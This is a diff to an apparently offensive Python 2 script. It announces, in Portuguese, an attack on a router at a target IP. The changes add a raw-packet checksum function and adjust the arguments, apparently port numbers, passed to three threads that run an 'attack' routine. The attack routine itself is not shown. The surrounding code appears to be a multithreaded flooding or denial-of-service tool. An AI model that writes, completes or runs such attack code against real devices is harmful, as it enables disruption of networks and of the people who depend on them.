@@ -5,6 +5,21 @@ from struct import *
 from threading import Thread
 import time 
 
+# checksum functions needed for calculation checksum
+def checksum(msg):
+    s = 0
+    # loop taking 2 characters at a time
+    for i in range(0, len(msg), 2):
+        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
+        s = s + w
+     
+    s = (s>>16) + (s & 0xffff);
+    #s = s + (s >> 16);
+    #complement and mask to 4 byte short
+    s = ~s & 0xffff
+     
+    return s
+
 def show_begin(ip_dest):
     import time
     print 'Iniciando o ataque ao roteador', ip_dest 
@@ -141,9 +156,9 @@ while 1:
 	if msg:
 		show_begin(dest_ip)
 
-		ataque2 = Thread(target=attack,args=[1,dest_ip])
-		ataque3 = Thread(target=attack,args=[2,dest_ip])
-		ataque4 = Thread(target=attack,args=[3,dest_ip])
+		ataque2 = Thread(target=attack,args=[6001])
+		ataque3 = Thread(target=attack,args=[7002])
+		ataque4 = Thread(target=attack,args=[8003])
 		
 
 
